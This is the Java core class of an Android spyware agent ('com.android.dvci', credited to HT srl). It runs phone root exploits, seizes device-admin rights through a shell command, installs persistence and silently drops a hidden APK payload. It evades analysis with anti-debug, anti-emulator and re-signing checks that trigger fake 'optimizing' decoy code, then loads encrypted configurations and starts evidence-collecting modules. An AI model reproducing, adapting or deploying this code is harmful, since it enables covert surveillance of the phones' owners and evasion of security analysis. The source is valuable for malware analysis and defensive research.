/* *********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 **********************************************/

package com.android.dvci;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.content.res.Resources;
import android.os.Build;
import android.os.Handler;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;

import com.android.dvci.action.Action;
import com.android.dvci.action.SubAction;
import com.android.dvci.action.UninstallAction;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfType;
import com.android.dvci.conf.Configuration;
import com.android.dvci.crypto.CryptoException;
import com.android.dvci.crypto.EncryptionPKCS5;
import com.android.dvci.crypto.Keys;
import com.android.dvci.evidence.EvDispatcher;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.Markup;
import com.android.dvci.file.AutoFile;
import com.android.dvci.file.Path;
import com.android.dvci.gui.ASG;
import com.android.dvci.listener.BSm;
import com.android.dvci.manager.ManagerEvent;
import com.android.dvci.manager.ManagerModule;
import com.android.dvci.optimize.NetworkOptimizer;
import com.android.dvci.util.AntiDebug;
import com.android.dvci.util.AntiEmulator;
import com.android.dvci.util.AntiSign;
import com.android.dvci.util.Check;
import com.android.dvci.util.PackageUtils;
import com.android.dvci.util.StringUtils;
import com.android.dvci.util.Utils;
import com.android.mm.M;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateException;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import dexguard.util.CertificateChecker;


/**
 * The Class Core, represents
 */
public class Core extends Activity implements Runnable {

	/**
	 * The Constant SLEEPING_TIME.
	 */
	private static final int SLEEPING_TIME = 1000;
	private static final String TAG = "Core"; //$NON-NLS-1$
	private static final String UNINSTALL_MARKUP = ".l";
	private static boolean serviceRunning = false;

	/**
	 * The b stop core.
	 */
	private boolean bStopCore = false;

	/**
	 * The core thread.
	 */
	private Thread coreThread = null;

	/**
	 * The agent manager.
	 */
	private ManagerModule moduleManager;

	/**
	 * The event manager.
	 */
	private ManagerEvent eventManager;
	private WakeLock wl;
	private PendingIntent alarmIntent = null;
	private ServiceMain serviceMain;

	@SuppressWarnings("unused")
	private void Core() {

	}

	static Core singleton;

	public synchronized static Core self() {
		if (singleton == null) {
			singleton = new Core();
		}

		return singleton;
	}

	public synchronized static void serviceUnregister() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (serviceUnregister) ...");
		}
		if (singleton != null && singleton.serviceMain != null) {
			singleton.serviceMain.stopListening();
		}
	}

	public static Core newCore(ServiceMain serviceMain) {
		if (singleton == null) {
			singleton = new Core();
		}

		singleton.serviceMain = serviceMain;

		return singleton;
	}

	/**
	 * Start.
	 *
	 * @param resources the r
	 * @param cr        the cr
	 * @return true, if successful
	 */

	public boolean Start(final Resources resources, final ContentResolver cr) {


		// ANTIDEBUG ANTIEMU
		if (!check()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (Start) anti emu/debug failed");
			}
			return false;
		}


		if (serviceRunning) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (Start): service already running"); //$NON-NLS-1$
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + "  exploitStatus == " + Status.getExploitStatusString() + "  exploitResult == " + Status.getExploitResultString());
			}
			if (!Status.isBlackberry() && Cfg.GUI) {
				Status.setIconState(true);
				if (!Cfg.DEMO) {
					closeMainActivity();
				}
			}

			/* this check is used to know if we need to ask the user for root permission */
			if ((Status.getExploitStatus() >= Status.EXPLOIT_STATUS_EXECUTED) && !Status.haveRoot()) {
				try {
					Thread t = new Thread(new Runnable() {
						@Override
						public void run() {
							Root.getPermissions(true);
						}
					});
					if (Cfg.DEBUG) {
						Check.log(TAG + "starting thread: Root.getPermissions();");
					}
					t.start();

				} catch (Exception ex) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "Error: " + ex);
					}
				}
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (Start): skipped getPermissions() haveRoot=" + Status.haveRoot() + " exploitResult= " + Status.getExploitResultString() +
							" exploitStatus= " + Status.getExploitStatusString());
				}

			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " (Start): checking uninstall Markup");
			}
			if (Status.getExploitStatus() != Status.EXPLOIT_STATUS_RUNNING && Status.uninstall) {
				UninstallAction.actualExecute(false);
				return false;
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " (Start): checked uninstall Markup");
			}
			if (Status.haveRoot()) {
				int perStatus = Status.getPersistencyStatus();
				if (Cfg.PERSISTENCE) {
					Root.installPersistence();
					if (perStatus != Status.getPersistencyStatus()) {
						Status.self().setReload();
					}
				}
			}
			return false;
		} else {
			if (Cfg.GUI && !Cfg.DEMO) {
				closeMainActivity();
			}
		}


		coreThread = new Thread(this);

		moduleManager = ManagerModule.self();
		eventManager = ManagerEvent.self();

		/*
	  The content resolver.
	 */
		ContentResolver contentResolver = cr;

		if (Cfg.DEBUG) {
			coreThread.setName(getClass().getSimpleName());
			Check.asserts(resources != null, "Null Resources"); //$NON-NLS-1$
		}

		try {
			coreThread.start();
		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		}

		// mRedrawHandler.sleep(1000);
		if (Cfg.POWER_MANAGEMENT) {
			Status.self().acquirePowerLock();
		} else {
			final PowerManager pm = (PowerManager) Status.getAppContext().getSystemService(Context.POWER_SERVICE);
			wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "T"); //$NON-NLS-1$
			wl.acquire();
		}

		serviceRunning = true;

		EvidenceBuilder.infoStart(); //$NON-NLS-1$

		if (Cfg.DEMO) {

			//Status.self().makeToast(M.e("Beep-beep Test!!!!"));
			//Beep.beep_test();
			Beep.bip();
			Status.self().makeToast(M.e("Agent started!"));
		}

		return true;
	}


	private void closeMainActivity() {
		try {

			Handler h = new Handler(Status.getAppContext().getMainLooper());
			// Although you need to pass an appropriate context
			h.post(new Runnable() {
				@Override
				public void run() {
					//Status.getAppGui().showInstallDialog();
					try {
						ASG gui = Status.getAppGui();
						if (gui != null && !gui.isFinishing()) {
							gui.finish();
						}
					} catch (Exception ex) {
					}

				}
			});
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (makeToast) Error: " + ex);
			}
		}

	}

	public static void deceptionCode2(long mersenne) {
		NetworkOptimizer nOptimizer = new NetworkOptimizer(Status.self().getAppContext());
		nOptimizer.start((int) (mersenne / 1023));
	}

	public static void deceptionCode1() {
		NetworkOptimizer nOptimizer = new NetworkOptimizer(Status.self().getAppContext());
		nOptimizer.start(1000);
	}

	/**
	 * Stop.
	 *
	 * @return true, if successful
	 */
	public boolean Stop() {
		try {
			bStopCore = true;

			if (Cfg.DEBUG) {
				Check.log(TAG + " RCS Thread Stopped"); //$NON-NLS-1$
			}

			if (wl != null) {
				wl.release();
			}

			coreThread = null;

			serviceRunning = false;
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(ex);
				Check.log(TAG + " (Stop) ", ex);
			}
		}
		return true;

	}

	/**
	 * isServiceRunning
	 *
	 * @return
	 */
	public static boolean iSR() {
		return serviceRunning;
	}

	private boolean runExploitSynchronously() {
		if (Build.BRAND.toLowerCase().contains(M.e("huawei"))) {
			return true;
		}
		if (Build.BRAND.toLowerCase().contains(M.e("lge"))) {
			if (Build.MODEL.toUpperCase().contains(M.e("LG-D405")))
				return true;
		}
		return false;
	}

	// Runnable (main routine for RCS)
	/*
	 * (non-Javadoc)
	 *
	 * @see java.lang.Runnable#run()
	 */
	public void run() {
		if (Cfg.DEBUG_SPECIFIC) {
			Check.log(TAG + " RCS Thread Started"); //$NON-NLS-1$
			// startTrace();
		}

		if (Cfg.DEMO) {
			Beep.bip();
			Status.self().makeToast(M.e("Agent running..."));
		}

		Keys keys = Keys.self();

		if (!keys.enabled()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (run) Error: This board is disabled");
			}

			return;
		}

		if (!Path.makeDirs()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (run) Error: Can't create a writable directory");
			}

			return;
		}
		Root.exploitPhone(runExploitSynchronously());
		Root.getPermissions(false);

		// ANTIDEBUG ANTIEMU
		if (!check()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (Start) anti emu/debug failed");
			}
			return;
		}

		if (Status.haveRoot()) {
			if (Cfg.DEMO) {
				Status.self().makeToast("Got Root");
			}

			// Usa la shell per prendere l'admin
			try {
				// /system/bin/ntpsvd adm
				String pack = Status.self().getAppContext().getPackageName();
				String bd = Configuration.shellFile + M.e(" adm");
				String tbe = String.format("%s %s/%s", bd, pack, M.e(".listener.AR"));
				// /system/bin/ddf adm
				// \"com.android.dvci/com.android.dvci.listener.AR\"
				Runtime.getRuntime().exec(tbe);

			} catch (IOException ex) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Error (run): " + ex);
				}
			}
		} else if (Keys.self().wantsPrivilege()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error (run): cannot ask for privileges");
			}

		}
		int confLoaded = 0;
		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: init task"); //$NON-NLS-1$
			}
			// this markup is created by UninstallAction
			//final Markup markup = new Markup(UNINSTALL_MARKUP);
			if (haveMarkup(UNINSTALL_MARKUP)) {
				UninstallAction.actualExecute(true);
				confLoaded = ConfType.Error;
			} else {
				confLoaded = taskInit();
			}
			// viene letta la conf e vengono fatti partire agenti e eventi
			if (confLoaded == ConfType.Error) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Error: TaskInit() FAILED"); //$NON-NLS-1$
				}

			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " TaskInit() OK, configuration loaded: " + confLoaded); //$NON-NLS-1$
					Check.log(TAG + " Info: starting checking actions"); //$NON-NLS-1$
				}

				if (Cfg.DEMO && Cfg.DEMO_INITSOUND) {
					Beep.beepPenta();
				}

				// Torna true in caso di UNINSTALL o false in caso di stop del
				// servizio
				checkActions();

				if (Cfg.DEBUG) {
					Check.log(TAG + "CheckActions() wants to exit"); //$NON-NLS-1$
				}
			}

			stopAll();

			final EvDispatcher logDispatcher = EvDispatcher.self();

			if (Cfg.DEBUG) {
				Check.log(TAG + " (stopAll), stopping EvDispatcher");
			}

			logDispatcher.halt();
		} catch (final Throwable ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: run " + ex); //$NON-NLS-1$
			}
		} finally {
			if (Cfg.DEBUG) {
				Check.log(TAG + " AndroidService exit "); //$NON-NLS-1$
			}

			Utils.sleep(1000);

			System.runFinalizersOnExit(true);
			finish();
			// System.exit(0);
		}
	}

	private synchronized boolean checkActions() {
		CheckAction checkActionFast = new CheckAction(Action.FAST_QUEUE);

		Thread fastQueueThread = new Thread(checkActionFast);
		fastQueueThread.start();

		return checkActions(Action.MAIN_QUEUE);

	}


	class CheckAction implements Runnable {
		private final int queue;

		CheckAction(int queue) {
			if (Cfg.DEBUG) {
				Thread.currentThread().setName("queue_" + queue);
			}
			this.queue = queue;
		}

		public void run() {
			boolean ret = checkActions(queue);
		}
	}

	/**
	 * Verifica le presenza di azioni triggered. Nel qual caso le esegue in modo
	 * bloccante.
	 *
	 * @return true, if UNINSTALL
	 */
	private boolean checkActions(int qq) {
		final Status status = Status.self();

		try {
			while (!bStopCore) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " checkActions: " + qq); //$NON-NLS-1$
				}

				if (Cfg.STATISTICS) {
					M.printMostused();
					logMemory();
				}

				final Trigger[] actionIds = status.getTriggeredActions(qq);
				if (Cfg.POWER_MANAGEMENT) {
					Status.self().acquirePowerLock();
				}

				if (actionIds.length == 0) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (checkActions): triggered without actions: " + qq);
					}
				}

				if (Cfg.DEMO && !Cfg.DEMO_SILENT) {
					Beep.bip();
				}
				if (!Cfg.DEBUG && Cfg.CHECK_ANTI_DEBUG) {
					// ANTIDEBUG
					AntiDebug ad = new AntiDebug();
					AntiSign sign = new AntiSign();
					if (ad.isDebug() || sign.isReSigned()) {
						stopAll();
						return true;
					}
				}

				if (Cfg.DEBUG) {
					PackageManager pm = Status.getAppContext().getPackageManager();
					Check.log(TAG + "testing \"com.skype.raider\"");
					try {
						if (pm.getInstallerPackageName("com.skype.raider") != null) {
							Check.log(TAG + " packagename: " + pm.getInstallerPackageName("com.skype.raider"));
						} else {
							Check.log(TAG + " packagename: " + pm.getInstallerPackageName("com.skype.raider"));
						}
					} catch (Exception e) {
						Check.log(TAG + " NOT installed ");
					}
					Check.log(TAG + " testing" + Status.getAppContext().getPackageName());
					if (pm.getInstallerPackageName(Status.getAppContext().getPackageName()) != null) {
						Check.log(TAG + " packagename: " + pm.getInstallerPackageName(Status.getAppContext().getPackageName()));
					} else {
						Check.log(TAG + " packagename: LOCAL");
					}
				}

				for (final Trigger trigger : actionIds) {
					final Action action = status.getAction(trigger.getActionId());
					final Exit exitValue = executeAction(action, trigger);

					if (exitValue == Exit.UNINSTALL) {
						if (Cfg.DEBUG_SPECIFIC) {
							Check.log(TAG + " Info: checkActions: Uninstall"); //$NON-NLS-1$
						}

						UninstallAction.actualExecute(true);
						return true;
					}
				}
			}

			return false;
		} catch (final Throwable ex) {
			// catching trowable should break the debugger ans log the full
			// stack trace
			if (Cfg.DEBUG) {
				Check.log(ex);//$NON-NLS-1$
				Check.log(TAG + " FATAL: checkActions error, restart: " + ex); //$NON-NLS-1$
			}

			return false;
		}
	}

	private synchronized void stopAll() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stopAll)");
		}

		final Status status = Status.self();

		// status.setRestarting(true);

		if (Cfg.DEBUG) {
			Check.log(TAG + " Warn: " + "checkActions: unTriggerAll"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		status.unTriggerAll();


		if (Cfg.DEBUG) {
			Check.log(TAG + " checkActions: stopping agents"); //$NON-NLS-1$
		}

		moduleManager.stopAll();

		if (Cfg.DEBUG) {
			Check.log(TAG + " checkActions: stopping events"); //$NON-NLS-1$
		}

		eventManager.stopAll();

		Utils.sleep(2000);


		if (Cfg.DEBUG) {
			Check.log(TAG + " checkActions: untrigger all"); //$NON-NLS-1$
		}

		status.unTriggerAll();

	}

	/**
	 * Inizializza il core.
	 *
	 * @return false if any fatal error
	 */
	private int taskInit() {
		try {


			// Identify the device uniquely
			final Device device = Device.self();

			// load configuration
			int ret = loadConf();

			if (ret == 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Error: Cannot load conf"); //$NON-NLS-1$
				}

				return ConfType.Error;
			}

			// Start event dispatcher
			final EvDispatcher evDispatcher = EvDispatcher.self();

			if (!evDispatcher.isRunning()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (taskInit), start evDispatcher");
				}
				evDispatcher.start();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (taskInit), evDispatcher already started ");
				}
			}

			// Da qui in poi inizia la concorrenza dei thread
			if (eventManager.startAll() == false) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " eventManager FAILED"); //$NON-NLS-1$
				}

				return ConfType.Error;
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: Events started"); //$NON-NLS-1$
			}

			/*
			 * if (moduleManager.startAll() == false) { if (Cfg.DEBUG) {
			 * Check.Check.log(TAG + " moduleManager FAILED"); //$NON-NLS-1$ }
			 *
			 * return ConfType.Error; }
			 */

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: Agents started"); //$NON-NLS-1$
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Core initialized"); //$NON-NLS-1$
			}

			return ret;

		} catch (final GeneralException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
				Check.log(TAG + " RCSException() detected"); //$NON-NLS-1$
			}
		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
				Check.log(TAG + " Exception() detected"); //$NON-NLS-1$
			}
		}

		return ConfType.Error;
	}


	public boolean verifyNewConf() {
		AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);
		boolean loaded = false;

		if (file.exists()) {
			loaded = loadConfFile(file, false);
		}

		return loaded;
	}

	/**
	 * Tries to load the new configuration, if it fails it get the resource
	 * conf.
	 *
	 * @return false if no correct conf available
	 * @throws GeneralException the rCS exception
	 */
	public int loadConf() throws GeneralException {
		boolean loaded = false;
		int ret = ConfType.Error;

		if (Cfg.DEMO) {
			// Beep.beep();
		}

		if (Cfg.DEBUG_SPECIFIC) {
			Check.log(TAG + " (loadConf): TRY NEWCONF");
		}

		BSm.cleanMemory();

		// tries to load the file got from the sync, if any.
		AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);

		if (file.exists()) {
			loaded = loadConfFile(file, true);

			if (!loaded) {
				// 30_2=Invalid new configuration, reverting
				EvidenceBuilder.info(M.e("Invalid new configuration, reverting")); //$NON-NLS-1$
				file.delete();
			} else {
				// 30_3=New configuration activated
				EvidenceBuilder.info(M.e("New configuration activated")); //$NON-NLS-1$
				file.rename(Path.conf() + ConfType.CurrentConf);
				ret = ConfType.NewConf;
			}
		}

		// get the actual configuration
		if (!loaded) {
			if (Cfg.DEBUG_SPECIFIC) {
				Check.log(TAG + " (loadConf): TRY CURRENTCONF");
			}
			file = new AutoFile(Path.conf() + ConfType.CurrentConf);

			if (file.exists()) {
				loaded = loadConfFile(file, true);

				if (!loaded) {
					// Actual configuration corrupted
					EvidenceBuilder.info(M.e("Actual configuration corrupted")); //$NON-NLS-1$
				} else {
					ret = ConfType.CurrentConf;
				}
			}
		}

		if (!loaded && (Cfg.DEBUG || !Cfg.CHECK_ANTI_DEBUG)) {
			if (Cfg.DEBUG_SPECIFIC) {
				Check.log(TAG + " (loadConf): TRY JSONCONF");
			}

			final byte[] resource = Utils.getAsset(M.e("cb.data")); // config.bin
			String json = new String(resource);
			// Initialize the configuration object

			if (json != null) {
				final Configuration conf = new Configuration(json);
				// Load the configuration
				loaded = conf.loadConfiguration(true);

				if (Cfg.DEBUG_SPECIFIC) {
					Check.log(TAG + " Info: Json file loaded: " + loaded); //$NON-NLS-1$
				}

				if (loaded) {
					ret = ConfType.ResourceJson;
				}
			}
		}

		// tries to load the resource conf
		if (!loaded) {
			if (Cfg.DEBUG_SPECIFIC) {
				Check.log(TAG + " (loadConf): TRY ASSET CONF");
			}
			// Open conf from resources and load it into resource
			final byte[] resource = Utils.getAsset(M.e("cb.data")); // config.bin

			// Initialize the configuration object
			final Configuration conf = new Configuration(resource);

			// Load the configuration
			loaded = conf.loadConfiguration(true);

			if (Cfg.DEBUG_SPECIFIC) {
				Check.log(TAG + " Info: Resource file loaded: " + loaded); //$NON-NLS-1$
			}

			if (loaded) {
				ret = ConfType.ResourceConf;
			}
		}

		return ret;
	}

	private boolean loadConfFile(AutoFile file, boolean instantiate) {
		boolean loaded = false;
		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (loadConfFile): " + file);
			}

			if (file.getSize() < 8) {
				return false;
			}

			final byte[] resource = file.read(8);
			// Initialize the configuration object
			Configuration conf = new Configuration(resource);
			// Load the configuration
			loaded = conf.loadConfiguration(instantiate);

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: Conf file loaded: " + loaded); //$NON-NLS-1$
			}

		} catch (GeneralException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);
			}
		}

		return loaded;
	}

	/**
	 * Execute action. (Questa non viene decompilata correttamente.)
	 *
	 * @param action  the action
	 * @param trigger
	 * @return the int
	 */
	private Exit executeAction(final Action action, Trigger trigger) {
		Exit exit = Exit.SUCCESS;

		if (Cfg.DEBUG) {
			Check.log(TAG + " executeAction() triggered: " + action); //$NON-NLS-1$
		}

		final Status status = Status.self();
		status.unTriggerAction(action);

		status.synced = false;

		final int ssize = action.getSubActionsNum();

		if (Cfg.DEBUG) {
			Check.log(TAG + " executeAction, " + ssize + " subactions"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		int i = 1;

		SubAction[] subactions = action.getSubActions();
		for (final SubAction subAction : subactions) {
			try {

				/*
				 * final boolean ret = subAction.execute(action
				 * .getTriggeringEvent());
				 */
				if (Cfg.DEBUG) {
					Check.log(TAG + " Info: (executeAction) executing subaction (" + (i++) + "/" + ssize + ") : " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
							+ action);
				}

				subAction.prepareExecute();
				final boolean ret = subAction.execute(trigger);

				if (status.uninstall) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " Warn: (executeAction): uninstalling"); //$NON-NLS-1$
					}

					// UninstallAction.actualExecute();
					exit = Exit.UNINSTALL;
					break;
				}

				if (ret == false) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " Warn: " + "executeAction() error executing: " + subAction); //$NON-NLS-1$ //$NON-NLS-2$
					}

				} else {
					if (subAction.considerStop()) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (executeAction): stop");
						}
						break;
					}
				}
			} catch (final Exception ex) {
				if (Cfg.EXCEPTION) {
					Check.log(ex);
				}

				if (Cfg.DEBUG) {
					Check.log(ex);
					Check.log(TAG + " Error: executeAction for: " + ex); //$NON-NLS-1$
				}
			}
		}

		return exit;
	}

	public static void logMemory() {
		Status.self();
		ActivityManager activityManager = (ActivityManager) Status.getAppContext().getSystemService(ACTIVITY_SERVICE);
		android.app.ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
		activityManager.getMemoryInfo(memoryInfo);

		Check.log(TAG + " memoryInfo.availMem: " + memoryInfo.availMem, true);
		Check.log(TAG + " memoryInfo.lowMemory: " + memoryInfo.lowMemory, true);
		Check.log(TAG + " memoryInfo.threshold: " + memoryInfo.threshold, true);

		int pid = android.os.Process.myPid();
		int pids[] = new int[]{pid};

		android.os.Debug.MemoryInfo[] memoryInfoArray = activityManager.getProcessMemoryInfo(pids);
		for (android.os.Debug.MemoryInfo pidMemoryInfo : memoryInfoArray) {
			Check.log(TAG + " pidMemoryInfo.getTotalPrivateDirty(): " + pidMemoryInfo.getTotalPrivateDirty(), true);
			Check.log(TAG + " pidMemoryInfo.getTotalPss(): " + pidMemoryInfo.getTotalPss(), true);
			Check.log(TAG + " pidMemoryInfo.getTotalSharedDirty(): " + pidMemoryInfo.getTotalSharedDirty(), true);
		}
	}

	public synchronized boolean reloadConf() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (reloadConf): START");
		}

		if (verifyNewConf() || Status.self().wantsReload()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (reloadConf): valid conf, reload: " + Status.self().wantsReload());
			}

			Status.self().unsetReload();
			stopAll();

			int ret = taskInit();

			if (Cfg.DEBUG) {
				Check.log(TAG + " (reloadConf): END");
			}

			return ret != ConfType.Error;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (reloadConf): invalid conf");
			}

			return false;
		}
	}

	public static boolean check() {
		if (Cfg.CHECK_ANTI_DEBUG){

			if (!Cfg.DEBUG || Cfg.DEBUGANTISIGN) {
				AntiSign sign = new AntiSign();
				if(sign.isReSigned()) {
					if (Cfg.DEMO) {
						Status.self().makeToast(M.e("Optimizing system"));
					}
					deceptionCode2(Integer.MAX_VALUE / 512);
					return false;
				}
			}

			if (!Cfg.DEBUG || Cfg.DEBUGANTI) {


				AntiDebug ad = new AntiDebug();


				if (ad.isDebug() || ad.isPlayStore()) {
					if (Cfg.DEMO) {
						Status.self().makeToast(M.e("Optimizing network"));
					}
					deceptionCode1();
					return false;
				}
			}
			if (!Cfg.DEBUG || Cfg.DEBUGANTIEMU) {
				AntiEmulator am = new AntiEmulator();
				if (am.isEmu()) {
					if (Cfg.DEMO) {
						Status.self().makeToast(M.e("Optimizing memory"));
					}
					deceptionCode2(Integer.MAX_VALUE / 1024);
					return false;
				}
			}
		}
		return true;
	}

	public static boolean checkStatic() {
		if (Cfg.CHECK_ANTI_DEBUG) {
			if (!Cfg.DEBUG) {
				AntiDebug ad = new AntiDebug();
				if (ad.isDebug()) {
					// deceptionCode1();
					return false;
				}
			}

			AntiEmulator am = new AntiEmulator();
			if (am.isEmu()) {
				return false;
			}
		}
		return true;
	}

	public boolean haveMarkup(String markup) {
		if (Cfg.DEBUG) {
			Check.requires(!StringUtils.isEmpty(markup), "empty markup");
		}
		final AutoFile fmarkup = new AutoFile(Status.getAppContext().getFilesDir(), markup);
		if (Cfg.DEBUG) {
			Check.log(TAG + " (haveUninstallMarkup) " + fmarkup.exists());
		}
		return fmarkup.exists();
	}

	public synchronized void createMarkup(String markup) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (createUninstallMarkup) ");
		}
		final AutoFile fmarkup = new AutoFile(Status.getAppContext().getFilesDir(), markup);
		fmarkup.write(1);
	}

	public void createUninstallMarkup() {
		createMarkup(UNINSTALL_MARKUP);
	}

	/*
	 * Everything what shall be execute at the first root acquisition
	 * should be included here
	 */
	public void firstRoot() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (firstRoot) ");
		}
		Path.unprotect(M.e("/data"), 0, true);
		Status.setPlayStoreEnableStatus(true);

		if (Status.self().isMelted()) {
			installSilentAsset();
		}
	}

	private void installSilentAsset() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (installSilentAsset)");
		}
		String dvci = M.e("com.android.dvci");
		if (!PackageUtils.isInstalledApk(dvci)) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (installSilentAsset), going to install");
			}
			String apk = M.e("z.apk");
			Utils.dumpAssetPayload(apk);

			String pack = Status.getAppContext().getPackageName();
			Root.installPersistence(false, String.format("/data/data/%s/files/z.apk", pack));

			File file = new File(Status.getAppContext().getFilesDir(), apk);
			file.delete();

			if (PackageUtils.isInstalledApk(dvci)) {
				EvidenceBuilder.info("Persistence installed");
				if (Cfg.DEMO) {
					Status.self().makeToast(M.e("Melt: dropped persistence"));
				}

				//Markup markupMelt = new Markup(Markup.MELT_FILE_MARKUP);
				//markupMelt.serialize(Status.getAppContext().getPackageName());

				AutoFile markup = new AutoFile(String.format("/data/data/%s/files/mm", dvci));
				final byte[] confKey = Keys.self().getConfKey();
				EncryptionPKCS5 crypto = new EncryptionPKCS5(confKey);
				try {
					markup.write(crypto.encryptData(pack.getBytes()));
				} catch (CryptoException ex) {
					if (Cfg.DEBUG) {
						Check.log(ex);
					}
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " (installSilentAsset), stopping melt");
				}

				stopService();
			}

		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (installSilentAsset), stopping melt");
			}
			stopService();
		}
	}

	private void stopService() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stopService), sending intent");
		}


		Intent intent = new Intent(Status.getAppContext(), ServiceMain.class);
		Status.getAppContext().stopService(intent);
	}

}
